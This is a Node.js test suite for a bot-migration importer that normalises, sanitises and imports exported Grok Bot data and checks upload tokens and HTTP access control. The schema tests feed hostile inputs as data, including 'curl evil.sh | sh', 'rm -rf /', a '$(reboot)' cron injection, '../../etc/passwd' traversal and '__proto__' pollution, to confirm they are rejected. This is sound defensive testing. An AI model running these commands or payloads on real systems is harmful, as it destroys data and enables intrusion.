import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { mkdtemp, readFile, rm, writeFile, readdir } from 'node:fs/promises';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';
import test from 'node:test';

import { normalizeBundle, bundleCounts, validCron, REDACTED } from '../server/migrate-schema.mjs';
import { bundleFromDirectory, bundleFromListing, bundleFromUpload, decodeBlobKey } from '../server/migrate-sources.mjs';
import { Migration, migratedAgentId, TOKEN_TTL_MS } from '../server/migrate.mjs';
import { migrationPrompt } from '../server/migrate-prompt.mjs';
import { Library } from '../server/library.mjs';
import { Skills } from '../server/skills.mjs';
import { decorateLocalMigrationApi } from '../runtime/migrate-import.mjs';
import { BOT_A, BOT_B, FAKE_KEY, blobName, fakeOriginalHost, folderZip, grokBotSlices, sampleBundle, writeGrokBotFolder, zipFiles } from './migrate-fixtures.mjs';

const temp = async t => { const dir = await mkdtemp(join(tmpdir(), 'rokbot-migrate-')); t.after(() => rm(dir, { recursive: true, force: true })); return dir; };
const stream = value => Readable.from([Buffer.from(typeof value === 'string' ? value : JSON.stringify(value))]);

async function setup(t, { now } = {}) {
  const dir = await temp(t);
  const fake = fakeOriginalHost();
  const api = decorateLocalMigrationApi({ api: {}, host: fake.host, dataDir: dir });
  const hostCall = async (method, args) => method === 'listAgents' ? fake.host.transcript.listAgentsSync() : api[method](args);
  const library = await new Library(dir).load(), skills = await new Skills(dir).load();
  const migration = await new Migration(dir, { hostCall, library, skills, ...(now ? { now } : {}) }).load();
  return { dir, fake, api, migration, library, skills };
}

// ---- Schema -------------------------------------------------------------------------------------

test('schema: a prompt export normalizes to an allowlisted bundle with paused routines', () => {
  const bundle = normalizeBundle(sampleBundle());
  assert.equal(bundle.bots.length, 1);
  const bot = bundle.bots[0];
  assert.equal(bot.key, `id:${BOT_A}`);
  assert.equal(bot.routines[0].enabled, false, 'imported routines are always paused');
  assert.equal(bot.routines[0].trigger, 'cron');
  assert.equal(bot.routines[0].schedule, '0 9 * * 1-5');
  assert.equal(bot.files[0].contentType, 'text/markdown');
  assert.deepEqual(bundleCounts(bundle), { bots: 1, memory: 2, skills: 2, botSkills: 1, globalSkills: 1, routines: 1, detectedRoutines: 0,
    files: 1, chatMessages: 2, chatBots: 1, userMemory: 1, secrets: 2, groups: 0, avatars: 1 });
  assert.ok(bundle.warnings.some(warning => warning.includes('手动启用')));
});

test('schema: rejects foreign documents, prototype keys, unsafe names and executables', () => {
  assert.throws(() => normalizeBundle({ schema: 'other', version: 1 }), /不是 RokBot 迁移文件/);
  assert.throws(() => normalizeBundle({ schema: 'rokbot.migrate', version: 2 }), /不支持的迁移文件版本/);
  assert.throws(() => normalizeBundle(JSON.parse('{"schema":"rokbot.migrate","version":1,"bots":[{"name":"x","__proto__":{"admin":true}}]}')), /不允许的字段/);
  assert.throws(() => normalizeBundle({ schema: 'rokbot.migrate', version: 1, bots: [{ name: 'x', settings: { constructor: { prototype: {} } } }] }), /不允许的字段/);
  for (const name of ['../../etc/passwd', 'a/b.md', '..', 'evil\u0000.md'])
    assert.throws(() => normalizeBundle(sampleBundle({ bots: [{ name: 'x', files: [{ name, text: 'x' }] }] })), /文件名称/);
  assert.throws(() => normalizeBundle(sampleBundle({ bots: [{ name: 'x', files: [{ name: 'run.sh', text: 'rm -rf /' }] }] })), /可执行文件/);
  const broken = normalizeBundle(sampleBundle({ bots: [{ name: 'x', files: [{ name: 'a.png', base64: '@@@' }, { name: 'b.md', text: 'ok' }] }] }));
  assert.deepEqual(broken.bots[0].files.map(file => file.name), ['b.md']);
  assert.ok(broken.warnings.some(warning => warning.includes('a.png')));
  let deep = { name: 'x' }; for (let i = 0; i < 20; i++) deep = { nested: deep };
  assert.throws(() => normalizeBundle(sampleBundle({ bots: [{ name: 'x', settings: deep }] })), /嵌套过深/);
  assert.throws(() => normalizeBundle(sampleBundle({ bots: [{ title: 'no name' }] })), /缺少Bot 名称/);
  assert.throws(() => normalizeBundle(sampleBundle({ bots: 'many' })), /需要是数组/);
});

test('schema: drops unknown and executable-looking fields, values of secrets and credential text', () => {
  const bundle = normalizeBundle(sampleBundle({
    run: 'curl evil.sh | sh',
    bots: [{ name: ' 助手\u0007 ', description: `用这个密钥 ${FAKE_KEY} 调接口`, exec: 'rm -rf /', settings: { hiddenFromSidebar: 'yes', shell: 'bash' },
      routines: [{ name: '定时', prompt: '做事', schedule: '每天早上九点', command: 'echo pwned', enabled: true }],
      avatar: { imageBase64: Buffer.from('not an image').toString('base64') } }],
    secrets: [{ name: 'OPENAI_API_KEY', value: FAKE_KEY }],
  }));
  const bot = bundle.bots[0];
  assert.equal(bot.name, '助手');
  assert.ok(bot.description.includes(REDACTED) && !bot.description.includes(FAKE_KEY));
  assert.equal(bot.settings.hiddenFromSidebar, undefined);
  assert.deepEqual(Object.keys(bot.routines[0]).sort(), ['description', 'enabled', 'name', 'prompt', 'trigger']);
  assert.equal(bot.routines[0].trigger, 'manual', 'a schedule that is not cron is kept as a note, not guessed');
  assert.match(bot.routines[0].description, /每天早上九点/);
  assert.equal(bot.avatar, undefined, 'non-image avatars are ignored');
  assert.deepEqual(bundle.secrets, [{ name: 'OPENAI_API_KEY' }]);
  assert.ok(!JSON.stringify(bundle).includes(FAKE_KEY));
  assert.ok(!JSON.stringify(bundle).includes('pwned') && !JSON.stringify(bundle).includes('rm -rf'));
  assert.ok(bundle.warnings.some(warning => warning.includes('未定义字段')));
  assert.ok(bundle.warnings.some(warning => warning.includes('疑似密钥')));
  assert.ok(validCron('*/15 9-18 * * MON-FRI') && !validCron('0 9 * *') && !validCron('$(reboot) * * * *'));
});

test('prompt: carries the schema, the upload URL and the fallback, without emoji', () => {
  const prompt = migrationPrompt({ uploadUrl: 'https://host.example/api/migrate/inbox/abc', expiresAt: Date.UTC(2026, 10, 28) });
  assert.match(prompt, /"schema": "rokbot\.migrate"/);
  assert.match(prompt, /"version": 1/);
  assert.match(prompt, /curl -sS -X POST .*https:\/\/host\.example\/api\/migrate\/inbox\/abc/);
  assert.match(prompt, /无法访问这个地址.*发给我/);
  assert.match(prompt, /不要写入任何密钥/);
  assert.doesNotMatch(prompt, /[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/u);
  assert.doesNotMatch(migrationPrompt(), /inbox/);
  const example = normalizeBundle(JSON.parse(prompt.slice(prompt.indexOf('{\n'), prompt.indexOf('\n}\n') + 2)));
  assert.equal(example.bots.length, 1, 'the example in the prompt is itself valid');
  assert.equal(example.bots[0].files.length, 1, 'placeholder Base64 is skipped with a warning, not fatal');
});

// ---- Sources ------------------------------------------------------------------------------------

test('sources: reads a Grok Bot data folder without opening credential files', async t => {
  const root = await writeGrokBotFolder(join(await temp(t), 'Grok Bot'));
  assert.equal(decodeBlobKey(blobName('sand.client.slice.ui-layout').slice(0, -5)), 'sand.client.slice.ui-layout');
  const opened = [];
  const paths = (await readdir(root, { recursive: true, withFileTypes: true })).filter(entry => entry.isFile())
    .map(entry => join(entry.parentPath ?? entry.path, entry.name).slice(root.length + 1));
  const bundle = await bundleFromListing(paths, async path => { opened.push(path); return readFile(join(root, path)); });
  assert.ok(opened.length > 0 && opened.every(path => path.startsWith('sand-client-persistence/')), `opened ${opened}`);
  assert.equal(bundle.bots.length, 2, 'group chats are not Bots');
  const [writer, research] = bundle.bots;
  assert.equal(writer.name, '写作助手');
  assert.equal(writer.description, '你是一位细致的中文写作助手。');
  assert.deepEqual(writer.avatar, { shape: 'blob', color: 'teal' });
  assert.deepEqual(writer.detectedRoutines, ['每日选题'], 'deleted routines are not offered');
  assert.equal(writer.chat.length, 2);
  assert.ok(writer.chat[0].text.includes(REDACTED), 'credentials pasted into chat are redacted');
  assert.deepEqual(writer.secrets.map(secret => secret.name), ['NOTION_TOKEN']);
  assert.equal(research.chat.length, 0);
  assert.deepEqual(bundle.groups, [{ name: '工作', bots: ['写作助手', 'Research'] }]);
  const secretNames = bundle.secrets.map(secret => secret.name);
  assert.ok(secretNames.includes('应用连接：Gmail'));
  assert.ok(secretNames.some(name => name.startsWith('例程 Webhook 密钥（1 个）')));
  assert.ok(!JSON.stringify(bundle).includes('SECRET'));
  assert.equal((await bundleFromDirectory(root)).bots.length, 2);
});

test('sources: legacy persistence maps, packed folders and several exports in one ZIP', async t => {
  const dir = await temp(t);
  assert.equal((await bundleFromDirectory(await writeGrokBotFolder(join(dir, 'legacy'), { legacy: true }))).bots.length, 2);
  await writeFile(join(dir, 'folder.zip'), folderZip());
  const packed = await bundleFromUpload(join(dir, 'folder.zip'));
  assert.deepEqual(packed.bots.map(bot => bot.name), ['写作助手', 'Research']);
  const second = sampleBundle({ bots: [{ sourceId: BOT_B, name: 'Research', memory: [{ content: 'prefers primary sources' }] }], userMemory: [], skills: [], secrets: [] });
  await writeFile(join(dir, 'exports.zip'), zipFiles({ 'exports/a.json': JSON.stringify(sampleBundle()), 'exports/b.json': JSON.stringify(second),
    'exports/readme.json': '{"unrelated":true}', ...Object.fromEntries(Object.entries(grokBotSlices()).map(([key, value]) => [`data/sand-client-persistence/${blobName(key)}`, value])) }));
  const merged = await bundleFromUpload(join(dir, 'exports.zip'));
  assert.equal(merged.bots.length, 2, 'the folder cache and the exports merge per Bot');
  const writer = merged.bots.find(bot => bot.name === '写作助手'), research = merged.bots.find(bot => bot.name === 'Research');
  assert.equal(writer.memory.length, 2); assert.equal(writer.chat.length, 2);
  assert.equal(research.memory.length, 1);
  await writeFile(join(dir, 'bundle.json'), JSON.stringify(sampleBundle()));
  assert.equal((await bundleFromUpload(join(dir, 'bundle.json'))).bots[0].skills.length, 1);
  await writeFile(join(dir, 'junk.bin'), 'hello');
  await assert.rejects(bundleFromUpload(join(dir, 'junk.bin')), /既不是 ZIP/);
  await writeFile(join(dir, 'empty.zip'), zipFiles({ 'a.txt': 'x' }));
  await assert.rejects(bundleFromUpload(join(dir, 'empty.zip')), /没有找到 Grok Bot 数据/);
});

// ---- Import -------------------------------------------------------------------------------------

test('import: creates Bots with memory, skills, paused routines, files and chat; a second import adds nothing', async t => {
  const { migration, fake, library, skills } = await setup(t);
  const first = await migration.receive(stream(sampleBundle()), { source: 'admin' });
  const preview = await migration.preview(first.id);
  assert.equal(preview.bots[0].status, 'new');
  const report = await migration.import(first.id, { bots: { [`id:${BOT_A}`]: { chat: true } } });
  const bot = report.bots[0];
  assert.equal(bot.action, 'created');
  assert.equal(bot.agentId, migratedAgentId(`id:${BOT_A}`));
  assert.deepEqual(bot.added, { memory: 2, skills: 1, routines: 1 });
  assert.equal(fake.agents.length, 1);
  assert.equal(fake.agents[0].avatarShape, 'blob');
  const routine = fake.automations.get(bot.agentId)[0];
  assert.equal(routine.isEnabled, false);
  assert.deepEqual(routine.trigger, { type: 'cron', schedule: '0 9 * * 1-5' });
  assert.equal(fake.workflows.get(bot.agentId)[0].body, '给出三个标题候选。', 'imported frontmatter is discarded');
  const files = (await library.list(bot.agentId)).files.map(file => file.name).sort();
  assert.deepEqual(files, ['Grok Bot 聊天记录.md', '风格指南.md']);
  assert.equal(report.userMemory.added, 1);
  assert.equal(skills.list().find(item => item.name === '共享周报').enabled, false, 'shared skills start disabled');
  assert.ok(report.secrets.includes('GITHUB_TOKEN') && report.secrets.includes('NOTION_TOKEN'));

  // The same file again, and the same package again: nothing is duplicated.
  const again = await migration.receive(stream(sampleBundle()), { source: 'inbox' });
  assert.equal((await migration.preview(again.id)).bots[0].status, 'imported');
  for (const packageId of [again.id, first.id]) {
    const repeat = await migration.import(packageId, { bots: { [`id:${BOT_A}`]: { chat: true } } });
    assert.equal(repeat.bots[0].action, 'updated');
    assert.deepEqual(repeat.bots[0].added, { memory: 0, skills: 0, routines: 0 });
    assert.equal(repeat.userMemory.added, 0);
    assert.equal(repeat.skills.added, 0);
    assert.equal(repeat.files.added, 0);
  }
  assert.equal(fake.agents.length, 1);
  assert.equal(fake.memories.get(bot.agentId).length, 2);
  assert.equal(fake.workflows.get(bot.agentId).length, 1);
  assert.equal(fake.automations.get(bot.agentId).length, 1);
  assert.equal(fake.userMemory.length, 1);
  assert.equal((await library.list(bot.agentId)).files.length, 2);
  assert.equal(skills.list().filter(item => item.name === '共享周报').length, 1);
});

test('import: a re-enabled routine stays as the user set it, and a deleted memory is not restored', async t => {
  const { migration, fake } = await setup(t);
  const item = await migration.receive(stream(sampleBundle()), { source: 'admin' });
  const { bots: [bot] } = await migration.import(item.id);
  fake.automations.get(bot.agentId)[0].isEnabled = true;
  fake.memories.get(bot.agentId).splice(0, 1);
  await migration.import(item.id);
  assert.equal(fake.automations.get(bot.agentId)[0].isEnabled, true);
  assert.equal(fake.memories.get(bot.agentId).length, 1);
});

test('import: same-name conflicts default to rename and honour skip and overwrite', async t => {
  const { migration, fake } = await setup(t);
  const existing = { id: '99999999-9999-4999-8999-999999999999', name: '写作助手', title: '旧', description: '旧指令' };
  fake.agents.push({ ...existing });
  const item = await migration.receive(stream(sampleBundle()), { source: 'admin' });
  const preview = await migration.preview(item.id);
  assert.equal(preview.bots[0].status, 'conflict');
  assert.equal(preview.bots[0].renameTo, '写作助手（迁移）');

  const skipped = await migration.import(item.id, { conflict: 'skip' });
  assert.equal(skipped.bots[0].action, 'skipped');
  assert.equal(fake.agents.length, 1);

  const overwritten = await migration.import(item.id, { bots: { [`id:${BOT_A}`]: { conflict: 'overwrite' } } });
  assert.equal(overwritten.bots[0].action, 'overwritten');
  assert.equal(overwritten.bots[0].agentId, existing.id);
  assert.equal(fake.agents.length, 1);
  assert.equal(fake.agents[0].description, '你是一位细致的中文写作助手。');
  assert.equal(fake.memories.get(existing.id).length, 2);
  // Once mapped, later imports update that Bot whatever the conflict policy says.
  assert.equal((await migration.preview(item.id)).bots[0].status, 'imported');

  const other = await setup(t);
  other.fake.agents.push({ ...existing });
  const second = await other.migration.receive(stream(sampleBundle()), { source: 'admin' });
  const renamed = await other.migration.import(second.id);
  assert.equal(renamed.bots[0].action, 'created');
  assert.equal(renamed.bots[0].targetName, '写作助手（迁移）');
  assert.deepEqual(other.fake.agents.map(agent => agent.name).sort(), ['写作助手', '写作助手（迁移）']);
  await other.migration.import(second.id);
  assert.equal(other.fake.agents.length, 2, 'renamed imports are idempotent too');
});

test('import: a Bot deleted after import is created again under a new ID; unselected Bots are skipped', async t => {
  const { migration, fake } = await setup(t);
  const item = await migration.receive(stream(sampleBundle()), { source: 'admin' });
  const first = (await migration.import(item.id)).bots[0].agentId;
  fake.agents.splice(0, fake.agents.length);
  const second = (await migration.import(item.id)).bots[0];
  assert.equal(second.action, 'created');
  assert.notEqual(second.agentId, first);
  assert.equal(fake.agents.length, 1);
  const skip = await migration.import(item.id, { bots: { [`id:${BOT_A}`]: { include: false } }, userMemory: false, skills: [] });
  assert.equal(skip.bots[0].action, 'skipped');
  assert.equal(skip.userMemory, null);
});

test('import: an interrupted run that already created the Bot resumes on the same Bot', async t => {
  const { migration, fake, api } = await setup(t);
  const item = await migration.receive(stream(sampleBundle()), { source: 'admin' });
  await api.importLocalMigrationBot({ agentId: migratedAgentId(`id:${BOT_A}`), profile: { name: '写作助手' }, memory: [], skills: [], routines: [] });
  assert.equal((await migration.preview(item.id)).bots[0].status, 'imported');
  await migration.import(item.id);
  assert.equal(fake.agents.length, 1);
});

// ---- Tokens -------------------------------------------------------------------------------------

test('tokens: last 24 hours, accept several uploads, and stop working when revoked or expired', async t => {
  let clock = Date.UTC(2026, 10, 27);
  const { migration } = await setup(t, { now: () => clock });
  const token = await migration.createToken({ label: '写作助手' });
  assert.equal(token.expiresAt - token.createdAt, TOKEN_TTL_MS);
  assert.match(token.token, /^[A-Za-z0-9_-]{43}$/);
  assert.equal(migration.verifyToken(token.token).id, token.id);
  await migration.receive(stream(sampleBundle()), { source: 'inbox', tokenId: token.id });
  await migration.receive(stream(sampleBundle()), { source: 'inbox', tokenId: token.id });
  assert.equal(migration.listTokens()[0].uploads, 2);
  assert.throws(() => migration.verifyToken('x'.repeat(43)), error => error.status === 404);
  assert.throws(() => migration.verifyToken('short'), error => error.status === 404);
  clock += TOKEN_TTL_MS + 1;
  assert.throws(() => migration.verifyToken(token.token), error => error.status === 410 && /过期/.test(error.message));
  assert.equal(migration.listTokens()[0].active, false);
  assert.equal(migration.listTokens()[0].token, undefined, 'inactive tokens are never shown again');
  const other = await migration.createToken();
  await migration.revokeToken(other.id);
  assert.throws(() => migration.verifyToken(other.token), error => error.status === 410 && /撤销/.test(error.message));
  const prompt = migration.prompt({ tokenId: other.id, baseUrl: 'https://h.example' });
  assert.equal(prompt.uploadUrl, null);
  assert.doesNotMatch(prompt.prompt, /inbox/);
});

test('packages: invalid uploads are rejected and leave nothing behind; discarded packages disappear', async t => {
  const { migration, dir } = await setup(t);
  await assert.rejects(migration.receive(stream('{"schema":"rokbot.migrate","version":9}'), { source: 'inbox' }), /版本/);
  await assert.rejects(migration.receive(stream('not json'), { source: 'inbox' }), /既不是 ZIP/);
  assert.deepEqual(await readdir(join(dir, 'migrate', 'uploads')), []);
  assert.deepEqual(migration.listPackages(), []);
  const item = await migration.receive(stream(sampleBundle()), { source: 'admin', label: '我的导出' });
  assert.equal(migration.listPackages()[0].label, '我的导出');
  await migration.discard(item.id);
  assert.deepEqual(migration.listPackages(), []);
  await assert.rejects(migration.preview(item.id), error => error.status === 404);
});

// ---- HTTP ---------------------------------------------------------------------------------------

const dependencies = existsSync(new URL('../server/node_modules/ws/package.json', import.meta.url));
test('http: admin upload, device access, inbox token lifecycle and blocked internal methods', { skip: !dependencies && 'run npm ci --prefix host/server' }, async t => {
  const { createSelfHostServer } = await import('../server/index.mjs');
  const dir = await temp(t), fake = fakeOriginalHost();
  const runtime = decorateLocalMigrationApi({ api: {}, host: fake.host, dataDir: join(dir, 'runtime') });
  const core = http.createServer(async (request, response) => {
    let body = ''; for await (const chunk of request) body += chunk;
    const method = request.url.replace('/api/', ''), args = body ? JSON.parse(body) : {};
    try {
      const result = method === 'listAgents' ? fake.host.transcript.listAgentsSync() : await runtime[method](args);
      response.writeHead(200, { 'content-type': 'application/json' }); response.end(JSON.stringify(result ?? null));
    } catch (error) { response.writeHead(error.status ?? 500, { 'content-type': 'application/json' }); response.end(JSON.stringify({ error: error.message })); }
  });
  await new Promise(resolve => core.listen(0, '127.0.0.1', resolve));
  const coreUrl = `http://127.0.0.1:${core.address().port}`;
  const host = await createSelfHostServer({ dataDir: dir, hostUrl: coreUrl, vncUrl: coreUrl, forkVncUrl: coreUrl, internalToken: 'c'.repeat(40) });
  await host.start(0, '127.0.0.1');
  t.after(async () => { await host.close(); await new Promise(resolve => core.close(resolve)); });
  const origin = `http://127.0.0.1:${host.server.address().port}`;
  await host.auth.setup(host.auth.setupKey, 'AdminPass123');
  const login = await fetch(`${origin}/admin/api/login`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-rokbot-csrf': '1' }, body: JSON.stringify({ password: 'AdminPass123' }) });
  const adminHeaders = { cookie: login.headers.get('set-cookie').split(';')[0], 'x-rokbot-csrf': '1' };
  const { token: deviceToken } = await host.auth.pair({ password: 'AdminPass123', deviceName: 'Mac', platform: 'desktop' });
  const device = { authorization: `Bearer ${deviceToken}` };

  // Admin: raw ZIP upload of a packed data folder, with no size limit configured.
  const upload = await fetch(`${origin}/admin/api/migrate/packages?name=${encodeURIComponent('Grok Bot.zip')}`, { method: 'POST', headers: { ...adminHeaders, 'content-type': 'application/zip' }, body: folderZip() });
  assert.equal(upload.status, 201, await upload.clone().text());
  const uploaded = await upload.json();
  assert.equal(uploaded.counts.bots, 2);
  assert.equal(uploaded.label, 'Grok Bot.zip');
  assert.equal((await fetch(`${origin}/admin/api/migrate/packages`, { method: 'POST', headers: { 'content-type': 'application/zip' }, body: folderZip() })).status, 403);
  assert.equal((await fetch(`${origin}/admin/api/migrate/packages`, { method: 'POST', headers: { 'content-type': 'application/zip', 'x-rokbot-csrf': '1' }, body: folderZip() })).status, 401);

  // Device: the same API with a device credential; without one it is refused.
  assert.equal((await fetch(`${origin}/local/migrate`)).status, 401);
  const tokenResponse = await fetch(`${origin}/local/migrate/tokens`, { method: 'POST', headers: { ...device, 'content-type': 'application/json' }, body: '{"label":"写作助手"}' });
  assert.equal(tokenResponse.status, 201);
  const token = await tokenResponse.json();
  assert.equal(token.uploadUrl, `${origin}/api/migrate/inbox/${token.token}`);
  assert.ok(token.prompt.includes(token.uploadUrl));

  // Inbox: no session, JSON or multipart, several uploads.
  assert.equal((await fetch(token.uploadUrl)).status, 200);
  const posted = await fetch(token.uploadUrl, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(sampleBundle()) });
  assert.equal(posted.status, 201);
  assert.equal((await posted.json()).ok, true);
  const form = new FormData(); form.append('file', new Blob([JSON.stringify(sampleBundle())], { type: 'application/json' }), 'rokbot-migrate.json');
  assert.equal((await fetch(token.uploadUrl, { method: 'POST', body: form })).status, 201);
  const bad = await fetch(token.uploadUrl, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"schema":"rokbot.migrate","version":1,"bots":[{"name":"x","__proto__":{}}]}' });
  assert.equal(bad.status, 400);
  assert.match((await bad.json()).error, /不允许的字段/);
  const listed = await (await fetch(`${origin}/local/migrate`, { headers: device })).json();
  assert.equal(listed.packages.length, 3);
  assert.equal(listed.tokens[0].uploads, 2);

  // Preview and import through the device API, then again: no duplicates.
  const inboxPackage = listed.packages.find(item => item.source === 'inbox');
  const preview = await (await fetch(`${origin}/local/migrate/packages/${inboxPackage.id}`, { headers: device })).json();
  assert.equal(preview.bots[0].status, 'new');
  for (let round = 0; round < 2; round++) {
    const imported = await fetch(`${origin}/local/migrate/packages/${inboxPackage.id}/import`, { method: 'POST', headers: { ...device, 'content-type': 'application/json' }, body: '{}' });
    assert.equal(imported.status, 200, await imported.clone().text());
    assert.equal((await imported.json()).bots[0].action, round ? 'updated' : 'created');
  }
  assert.equal(fake.agents.length, 1);
  const folderImport = await fetch(`${origin}/admin/api/migrate/packages/${uploaded.id}/import`, { method: 'POST', headers: { ...adminHeaders, 'content-type': 'application/json' }, body: '{}' });
  assert.equal(folderImport.status, 200);
  assert.deepEqual(fake.agents.map(agent => agent.name).sort(), ['Research', '写作助手'], 'the folder and the export map to the same Bot by Grok Bot ID');

  // Revoking stops the URL immediately; devices can never call the internal import methods.
  assert.equal((await fetch(`${origin}/local/migrate/tokens/${token.id}`, { method: 'DELETE', headers: device })).status, 200);
  assert.equal((await fetch(token.uploadUrl, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(sampleBundle()) })).status, 410);
  assert.equal((await fetch(`${origin}/api/migrate/inbox/${'x'.repeat(43)}`, { method: 'POST', body: '{}' })).status, 404);
  for (const method of ['importLocalMigrationBot', 'importLocalMigrationUserMemory'])
    assert.equal((await fetch(`${origin}/api/${method}`, { method: 'POST', headers: { ...device, 'content-type': 'application/json' }, body: '{}' })).status, 403);
});
